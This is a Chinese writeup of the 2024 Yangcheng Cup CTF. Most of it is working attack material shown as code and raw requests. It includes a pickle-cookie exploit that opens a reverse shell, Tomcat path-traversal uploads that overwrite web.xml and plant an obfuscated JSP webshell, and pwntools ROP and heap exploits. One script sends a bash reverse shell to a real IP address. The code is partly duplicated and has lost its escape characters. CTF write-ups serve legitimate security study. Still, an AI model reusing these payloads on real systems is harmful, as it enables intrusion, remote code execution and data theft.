# 2024年“羊城杯”粤港澳大湾区网络安全大赛Writeup

> 原文: https://www.ctfiot.com/201747.html
> ID: 201747

Web

Lyrics For You

通过文件读取读取源码

源码如下

import os
import random

# from config.secret_key import secret_code
from flask import Flask, make_response, request, render_template
from cookie import set_cookie, cookie_check, get_cookie
import pickle

app = Flask(__name__)
app.secret_key = random.randbytes(16)

class UserData:
    def __init__(self, username):
        self.username = username

def Waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word.lower() in data.lower():
            valid = True
            break
    return valid

@app.route("/", methods=['GET'])
def index():
    return render_template('index.html')

@app.route("/lyrics", methods=['GET'])
def lyrics():
    resp = make_response()
    resp.headers["Content-Type"] = 'text/plain; charset=UTF-8'
    query = request.args.get("lyrics")
    path = os.path.join(os.getcwd() + "/lyrics", query)

    try:
        with open(path) as f:
            res = f.read()
    
except Exception as e:
        return "No lyrics found"
    return res

@app.route("/login", methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form["username"]
        user = UserData(username)
        res = {"username": user.username}
        return set_cookie("user", res, secret=secret_code)
    return render_template('login.html')

@app.route("/board", methods=['GET'])
def board():
    invalid = cookie_check("user", secret=secret_code)
    if invalid:
        return "Nope, invalid code get out!"

    data = get_cookie("user", secret=secret_code)

    if isinstance(data, bytes):
        a = pickle.loads(data)
        data = str(data, encoding="utf-8")

    if "username" not in data:
        return render_template('user.html', name="guest")
    if data["username"] == "admin":
        return render_template('admin.html', name=data["username"])
    if data["username"] != "admin":
        return render_template('user.html', name=data["username"])

if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    app.run(host="0.0.0.0", port=8080)

分析cookie.py逻辑,构造exp如下，直接反弹shell

import base64
import hashlib
import hmac
import pickle

from flask import make_response, request

unicode = str
basestring = str

# Quoted from python bottle template, thanks :D

def cookie_encode(data, key):
    msg = base64.b64encode(pickle.dumps(data, -1))
    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
    return tob('!') + sig + tob('?') + msg

def cookie_decode(data, key):
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):
            return pickle.loads(base64.b64decode(msg))
    return None

def waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word in data:
            valid = True
            # print(word)
            break
    return valid

def cookie_check(key, secret=None):
    a = request.cookies.get(key)
    data = tob(request.cookies.get(key))
    if data:
        if cookie_is_encoded(data):
            sig, msg = data.split(tob('?'), 1)
            if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):
                res = base64.b64decode(msg)
                if waf(res):
                    return True
                else:
                    return False
        return True
    else:
        return False

def tob(s, enc='utf8'):
    return s.encode(enc) if isinstance(s, unicode) else bytes(s)

def get_cookie(key, default=None, secret=None):
    value = request.cookies.get(key)
    if secret and value:
        dec = cookie_decode(value, secret)
        return dec[1] if dec and dec[0] == key else default
    return value or default

def cookie_is_encoded(data):
    return bool(data.startswith(tob('!')) and tob('?') in data)

def _lscmp(a, b):
    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)

def set_cookie(name, value, secret=None, **options):
    if secret:
        value = touni(cookie_encode((name, value), secret))
        resp = make_response("success")
        resp.set_cookie("user", value, max_age=3600)
        return resp
    elif not isinstance(value, basestring):
        raise TypeError('Secret key missing for non-string Cookie.')

    if len(value) > 4096:
        raise ValueError('Cookie value to long.')

def touni(s, enc='utf8', err='strict'):
    return s.decode(enc, err) if isinstance(s, bytes) else unicode(s)

opcode=b'''(cos
system
S'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'
o.'''

secret="EnjoyThePlayTime123456"
exp = touni(cookie_encode(('user', opcode), secret))
print(exp)

服务器接收读取flag即可

参考：https://lebr0nli.github.io/blog/security/SekaiCTF-2022/

tomtom2

接口任意文件读取，读取配置文件tomcat-users.xml

构造路径，去覆盖网站的 web.xml，数据包如下。

覆盖后进行上传txt文件，这里会将其解析为jsp木马，PUT发包如下。

连接木马，读取flag即可


```
import os
import random

# from config.secret_key import secret_code
from flask import Flask, make_response, request, render_template
from cookie import set_cookie, cookie_check, get_cookie
import pickle

app = Flask(__name__)
app.secret_key = random.randbytes(16)

class UserData:
    def __init__(self, username):
        self.username = username

def Waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word.lower() in data.lower():
            valid = True
            break
    return valid

@app.route("/", methods=['GET'])
def index():
    return render_template('index.html')

@app.route("/lyrics", methods=['GET'])
def lyrics():
    resp = make_response()
    resp.headers["Content-Type"] = 'text/plain; charset=UTF-8'
    query = request.args.get("lyrics")
    path = os.path.join(os.getcwd() + "/lyrics", query)

    try:
        with open(path) as f:
            res = f.read()
    
except Exception as e:
        return "No lyrics found"
    return res

@app.route("/login", methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form["username"]
        user = UserData(username)
        res = {"username": user.username}
        return set_cookie("user", res, secret=secret_code)
    return render_template('login.html')

@app.route("/board", methods=['GET'])
def board():
    invalid = cookie_check("user", secret=secret_code)
    if invalid:
        return "Nope, invalid code get out!"

    data = get_cookie("user", secret=secret_code)

    if isinstance(data, bytes):
        a = pickle.loads(data)
        data = str(data, encoding="utf-8")

    if "username" not in data:
        return render_template('user.html', name="guest")
    if data["username"] == "admin":
        return render_template('admin.html', name=data["username"])
    if data["username"] != "admin":
        return render_template('user.html', name=data["username"])

if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    app.run(host="0.0.0.0", port=8080)
import base64
import hashlib
import hmac
import pickle

from flask import make_response, request

unicode = str
basestring = str

# Quoted from python bottle template, thanks :D

def cookie_encode(data, key):
    msg = base64.b64encode(pickle.dumps(data, -1))
    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
    return tob('!') + sig + tob('?') + msg

def cookie_decode(data, key):
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):
            return pickle.loads(base64.b64decode(msg))
    return None

def waf(data):
    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']
    valid = False
    for word in blacklist:
        if word in data:
            valid = True
            # print(word)
            break
    return valid

def cookie_check(key, secret=None):
    a = request.cookies.get(key)
    data = tob(request.cookies.get(key))
    if data:
        if cookie_is_encoded(data):
            sig, msg = data.split(tob('?'), 1)
            if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):
                res = base64.b64decode(msg)
                if waf(res):
                    return True
                else:
                    return False
        return True
    else:
        return False

def tob(s, enc='utf8'):
    return s.encode(enc) if isinstance(s, unicode) else bytes(s)

def get_cookie(key, default=None, secret=None):
    value = request.cookies.get(key)
    if secret and value:
        dec = cookie_decode(value, secret)
        return dec[1] if dec and dec[0] == key else default
    return value or default

def cookie_is_encoded(data):
    return bool(data.startswith(tob('!')) and tob('?') in data)

def _lscmp(a, b):
    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)

def set_cookie(name, value, secret=None, **options):
    if secret:
        value = touni(cookie_encode((name, value), secret))
        resp = make_response("success")
        resp.set_cookie("user", value, max_age=3600)
        return resp
    elif not isinstance(value, basestring):
        raise TypeError('Secret key missing for non-string Cookie.')

    if len(value) > 4096:
        raise ValueError('Cookie value to long.')

def touni(s, enc='utf8', err='strict'):
    return s.decode(enc, err) if isinstance(s, bytes) else unicode(s)

opcode=b'''(cos
system
S'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'
o.'''

secret="EnjoyThePlayTime123456"
exp = touni(cookie_encode(('user', opcode), secret))
print(exp)
GET /myapp/read?filename=conf%2Ftomcat-users.xml HTTP/1.1
Host: 139.155.126.78:
39638
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:
39638/myapp/read.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=84F61594500171D149C871C6F7B54415
Connection: keep-alive
HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 2780
Date: Tue, 27 Aug 2024 10:55:35 GMT
Keep-Alive: timeout=20
Connection: keep-alive

<h1>Read to file: conf/tomcat-users.xml</h1>

<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file 
except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:
xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:
schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

  

<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  " roles="tomcat"/>
  " roles="tomcat,role1"/>
  " roles="role1"/>
-->
</tomcat-users>
POST /myapp/upload?path=../../../../opt/tomcat/conf HTTP/1.1
Host: 139.155.126.78:
39638
Content-Length: 2114
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://139.155.126.78:
39638
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4YDaOFFwGAGYlssW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:
39638/myapp/upload.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
Connection: keep-alive

------WebKitFormBoundary4YDaOFFwGAGYlssW
Content-Disposition: form-data; name="file"; filename="web.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:
xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:
schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
        <servlet>
            <servlet-name>default</servlet-name>
            <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
            
                debug
                0
            
            
                listings
                false
            
            <!-- 允许 PUT 和 DELETE 请求 -->
            
                readonly
                false
            
            <load-on-startup>1</load-on-startup>
        </servlet>

        <servlet-mapping>
            <servlet-name>default</servlet-name>
            /
        </servlet-mapping>
    <servlet>
    <servlet-name>jsp</servlet-name>
    <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
    
        fork
        false
    
    
        mappedfile
        false
    
    
        xpoweredBy
        false
    
    <load-on-startup>3</load-on-startup>
</servlet>
         <servlet-mapping>
            <servlet-name>jsp</servlet-name>
            *.txt
        </servlet-mapping>
</web-app>
------WebKitFormBoundary4YDaOFFwGAGYlssW--
POST /myapp/upload?path=../../../../opt/tomcat/conf HTTP/1.1
Host: 139.155.126.78:
39638
Content-Length: 2114
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://139.155.126.78:
39638
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4YDaOFFwGAGYlssW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:
39638/myapp/upload.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
Connection: keep-alive

------WebKitFormBoundary4YDaOFFwGAGYlssW
Content-Disposition: form-data; name="file"; filename="web.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:
xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:
schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
        <servlet>
            <servlet-name>default</servlet-name>
            <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
            
                debug
                0
            
            
                listings
                false
            
            <!-- 允许 PUT 和 DELETE 请求 -->
            
                readonly
                false
            
            <load-on-startup>1</load-on-startup>
        </servlet>

        <servlet-mapping>
            <servlet-name>default</servlet-name>
            /
        </servlet-mapping>

</web-app>

------WebKitFormBoundary4YDaOFFwGAGYlssW--
PUT /2.txt HTTP/1.1
Host: 139.155.126.78:
39638
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://139.155.126.78:
39638
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:
39638/myapp/upload.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
Connection: keep-alive
Content-Length: 1922

<%! public byte[] AQUdM(String Strings,String k) throws Exception { javax.crypto.Cipher B4316j = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");B4316j.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName("javax.crypto.spec.SecretKeySpec").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), "AES"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = "";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod("getDecoder").invoke(null);bytes =  (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = "";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) B4316j.getClass()./*Z5BB7988x4*/getDeclaredMethod/*Z5BB7988x4*/("doFinal", new Class[]{byte[].class}).invoke(B4316j,new Object[]{bytes});
return result;} %><%  try {  String K23u86W = "1a1dc91c907325c6";  session.putValue("u", K23u86W);  byte[] I0A0072 = AQUdM (request.getReader().readLine(),K23u86W);  java./*Z5BB7988x4*/lang./*Z5BB7988x4*/reflect.Method AQUdM = Class.forName("java.lang.ClassLoader").getDeclaredMethod/*Z5BB7988x4*/("defineClass",byte[].class,int/**/.class,int/**/.class);  AQUdM.setAccessible(true);  Class i = (Class)AQUdM.invoke(Thread.currentThread()./*Z5BB7988x4*/getContextClassLoader(), I0A0072 , 0, I0A0072.length);  Object Q676 = i./*Z5BB7988x4*/newInstance();  Q676.equals(pageContext); } catch (Exception e) {} %>
GET /2.txt HTTP/1.1
Host: 139.155.126.78:
39638
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://139.155.126.78:
39638
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://139.155.126.78:
39638/myapp/upload.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
Connection: keep-alive
file://localhost/ffffffllllllaaaaagggggggg
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
    #libc = ELF("../libc/")
libc = ELF("./libc.so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("139.155.126.78",31982)
    elf = ELF(name)

get_p("./pwn")

leave = 0x00000000004006db
gadget = 0x004006C4

bss = 0x601058 + 0xd00
payload = b"A"*0x30 + p64(bss) + p64(gadget)
pop_rbp = 0x00000000004005b0
pop_rdi = 0x0000000000400773
p.sendafter("Can you grasp this little bit of overflow?",payload)
sleep(0.2)

payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(pop_rbp) + p64(0x601d50+0x30) + p64(gadget) + p64(bss-0x38) + p64(leave)
p.send(payload) 
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - libc.sym['puts']
# gdb.attach(p,"")
# sleep(2)

print(hex(libc.address))
sleep(0.2)

payload =p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))  + p64(libc.sym['system']) + p64(0)*3 + p64(bss-0x38) + p64(leave)
p.send(payload)

p.interactive()
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
libc = ELF("./libc.so.6")

def get_p(name):
    global p,elf 
    p = process(name)
    # p = remote("139.155.126.78",38759)
    elf = ELF(name)

def add(size,planA,planB,content):
    p.sendlineafter("5. Calculate the distance.",'1')
    if size == 0x510:
        p.sendlineafter("What kind of transportation do you want?","car")
    elif size == 0x520:
        p.sendlineafter("What kind of transportation do you want?","train")
    elif size == 0x530:
        p.sendlineafter("What kind of transportation do you want?","plane")

    p.sendlineafter("where?",planA)
    p.sendlineafter("where?",planB)
    p.sendlineafter("How far?",'1000')
    p.sendafter("Note:",content)

def dele(planA,planB):
    p.sendlineafter("5. Calculate the distance.",'2')
    p.sendlineafter("where?",planA)
    p.sendlineafter("where?",planB)

def show(planA,planB):
    p.sendlineafter("5. Calculate the distance.",'3')
    p.sendlineafter("where?",planA)
    p.sendlineafter("To where?",planB)

def edit(planA,planB,idx,far,content):
    p.sendlineafter("5. Calculate the distance.",'4')
    p.sendlineafter("where?",planA)
    p.sendlineafter("where?",planB)
    p.sendlineafter("Which one do you want to change?",str(idx))
    p.sendlineafter("How far?",far)
    p.sendafter("Note:",content)

def calc(A):
    p.sendlineafter("5. Calculate the distance.",'5')
    p.sendlineafter("Where do you want to travel?",A)

def leak():
    global heap,libc
    g = 'guangzhou'
    na = 'nanchang'
    f = 'fuzhou'
    n = 'nanning'
    c = 'changsha'

    get_p("./pwn")
    add(0x510,g,n,"Feng_ZZ")
    add(0x530,n,c,"Feng_ZZ")
    add(0x520,c,na,"Feng_ZZ")

    calc(na)
    dele(g,n)
    add(0x530,f,na,"Feng_ZZ")

    add(0x510,g,n,"x70")
    show(g,n)
    p.recvuntil("Note:")
    heap = u64(p.recv(6).ljust(0x8,b"x00")) - 0x1470
    print(hex(heap))

    dele(n,c)
    dele(g,n)

    add(0x530,n,c,"A"*0x510)
    show(n,c)
    libc.address = u64(p.recvuntil("x7f")[-6:].ljust(0x8,b"x00")) - 0x219ce0 - 0x1000
    print(hex(libc.address))

def attack():
    global heap,libc
    g = 'guangzhou'
    na = 'nanchang'
    f = 'fuzhou'
    n = 'nanning'
    c = 'changsha'

    dele(n,c)
    dele(f,na)

    payload = b"A"*0x510 + p32(3) + p32(4) + p64(3)
    add(0x530,n,c,payload)

    dele(c,na)

    add(0x520,c,na,"Feng_ZZ")
    add(0x530,f,na,"Feng_ZZ")
    add(0x510,g,n,"Feng_ZZ")

    dele(c,na)
    add(0x530,f,na,"Feng_ZZ")
    dele(g,n)

    fd = libc.address + 0x21b110
    chunk = 0x19b0 + heap

    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    pop_rsi = 0x000000000002be51  + libc.address
    ret = 0x0000000000029139 + libc.address
    setcontext = libc.sym['setcontext']
    pop_rdi = 0x000000000002a3e5 + libc.address
    pop_rdx_12 = 0x000000000011f2e7 + libc.address
    FP = heap + 0x19b0
    A = FP + 0x100
    B = A + 0xe0 - 0x60
    ROP_addr = FP + 0x400 + 0x30
    payload = (0xa0-0x10)*b"x00" + p64(A) # 
    payload = payload.ljust(0xb0,b"x00") + p64(1)
    payload = payload.ljust(0xc8,b"x00") + p64(_IO_wfile_jumps-0x40)
    payload = payload.ljust(0x190,b"x00") + p64(ROP_addr) + p64(ret)
    payload = payload.ljust(0xf0+0xe0,b"x00") + p64(B) + p64(setcontext + 61)

    orw = b"x00"*(0x410-0x1d0) + p64(pop_rdi) + p64(heap) + p64(pop_rsi) + p64(0x3000) + p64(pop_rdx_12) + p64(7) + p64(0) + p64(libc.sym['mprotect']) + p64(heap+0x11e0+0xc48)
    orw += asm(shellcraft.cat("/flag"))

    payload = p64(0)+p64(0x531)+p64(fd)*2+p64(chunk)+p64(libc.sym['_IO_list_all']-0x20)+payload[0x20:] + orw
    edit(f,na,0x10000,payload)
    add(0x530,f,na,"Feng_ZZ")
    add(0x510,g,n,payload[0x10:])
    # gdb.attach(p,"")
    # sleep(2)
    p.sendlineafter("distance.",'4')

leak()
attack()
p.interactive()
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
    #libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("139.155.126.78",32429)
    elf = ELF(name)

get_p("./httpd")

host = '192.168.1.1'
request = 'get /"s"h>/dev/null HTTP/1.0rn'
request += 'Host: ' + host + 'rn'
request += 'Content-Length: 123rn'
request += 'rn'  # blank line to indicate end of headers
request += 'AAA'
# gdb.attach(p,"b *$rebase(0x0001AD6)")
# sleep(2)
p.sendline(request)
sleep(2)
p.sendline('bash -c "bash -i >& /dev/tcp/47.95.192.86/2333 0>&1"')
p.interactive()
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
    #libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("139.155.126.78",30356)
    elf = ELF(name)

get_p("./pwn")
for i in range(8):
    p.sendlineafter("Your chocie:",'1')
    p.sendafter("You can record log details here: ","A"*0x10)
    p.sendlineafter("Do you need to check the records? ",'N')

p.sendlineafter("Your chocie:",'1')
p.sendafter("You can record log details here: ","/bin/shx00")
p.sendlineafter("Do you need to check the records? ",'N')

p.sendlineafter("Your chocie:",'2')
payload = b"A"*0x70 + p64(0x404200) + p64(0x0401BC7)
p.sendafter("Type your message here plz: ",payload)
# gdb.attach(p,"")
p.interactive()
import itertools
import string
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import threading

class RC4:
    def __init__(self, key):
        self.S = self.KSA(key)
        self.keystream = self.PRGA(self.S)
    
    def KSA(self, key):
        key_length = len(key)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % key_length]) % 256
            S[i], S[j] = S[j], S[i]
        return S

    def PRGA(self, S):
        i = 0
        j = 0
        while True:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            yield K

    def encrypt(self, plaintext):
        ciphertext = []
        for b in plaintext:
            ciphertext.append(b ^ next(self.keystream) ^ 0x11)
        return ciphertext

class BruteForceCracker:
    def __init__(self):
        self.queue = Queue()
        self.lock = threading.Lock()
        # 固定的 plaintext
        self.plaintext = [0x85, 0x43, 0x72, 0x78]
    
    def generate_keys(self):
        characters = string.digits + string.ascii_letters
        for combo in itertools.product(characters, repeat=5):
            key = ''.join(combo)
            self.queue.put(key)
    
    def process_key(self):
        while not self.queue.empty():
            key = self.queue.get()
            plaintext = [b ^ ord(key[1]) for b in self.plaintext]
            
            rc4 = RC4(key.encode())
            ciphertext = rc4.encrypt(plaintext)

            if ciphertext[:4] == [0x89, 0x50, 0x4e, 0x47]:      # [0x89, 0x50, 0x4e, 0x47][246, 110, 106, 36]
                with self.lock:
                    print(f"Found key: {key}")
                    exit()
                return key
        
        return None
    
    def run(self):
        # Generate all keys
        self.generate_keys()

        # Run threads
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(self.process_key) for _ in range(10)]
            for future in futures:
                result = future.result()
                if result:
                    return result
        
        print("No match found.")
        return None

if __name__ == '__main__':
    cracker = BruteForceCracker()
    found_key = cracker.run()
void __cdecl Test::~Test(Test *const this)
{
  int i; // [esp+2Ch] [ebp-Ch]

  for ( i = 0; i <= 32; ++i )
  {
    if ( std::
abs(check[i] - in[i]) > (long double)(double)0.0001 )
    {
      puts("Wrong!!");
      exit(0);
    }
  }
  puts("Right!!");
}
void __cdecl __static_initialization_and_destruction_0(int __initialize_p, int __priority)
{
  std::
ios_base::
Init *v2; // [esp+0h] [ebp-18h]
  std::
vector<double> *const v3; // [esp+0h] [ebp-18h]
  Test *const v4; // [esp+0h] [ebp-18h]
  Test2 *const v5; // [esp+0h] [ebp-18h]

  if ( __initialize_p == 1 && __priority == 0xFFFF )
  {
    std::
ios_base::
Init::
Init(v2);
    atexit(__tcf_0);
    std::
vector<double>::
vector(v3);
    atexit(__tcf_1);
    Test::
Test(v4);                             // len(input) == 33
    atexit(__tcf_2);
    Test2::
Test2(v5);                           // ROT13
    atexit(__tcf_3);
  }
}
void __cdecl Test2::~Test2(Test2 *const this)
{
  std::
vector *v1; // eax
  char v2; // bl
  int v3; // eax
  std::
allocator *v4; // [esp+0h] [ebp-68h]
  std::
allocator *const v5; // [esp+0h] [ebp-68h]
  std::
vector<double> *const v6; // [esp+0h] [ebp-68h]
  std::
vector<double> *const v7; // [esp+0h] [ebp-68h]
  std::
vector<double> *const v8; // [esp+0h] [ebp-68h]
  __gnu_cxx::
__normal_iterator<double*,std::
vector<double> > *v9; // [esp+0h] [ebp-68h]
  __gnu_cxx::
__normal_iterator<double*,std::
vector<double> > *const v10; // [esp+0h] [ebp-68h]
  std::
vector::
size_type v11; // [esp+4h] [ebp-64h]
  std::
vector<double> *v12; // [esp+4h] [ebp-64h]
  const std::
vector::
allocator_type *v13; // [esp+8h] [ebp-60h]
  std::
vector<double>::
iterator __for_end; // [esp+24h] [ebp-44h] BYREF
  std::
vector<double>::
iterator __for_begin; // [esp+28h] [ebp-40h] BYREF
  std::
vector input; // [esp+2Ch] [ebp-3Ch] BYREF
  std::
vector::
size_type __n[3]; // [esp+3Bh] [ebp-2Dh] BYREF
  double val; // [esp+48h] [ebp-20h]
  std::
vector<double> *__for_range; // [esp+54h] [ebp-14h]
  int i; // [esp+58h] [ebp-10h]
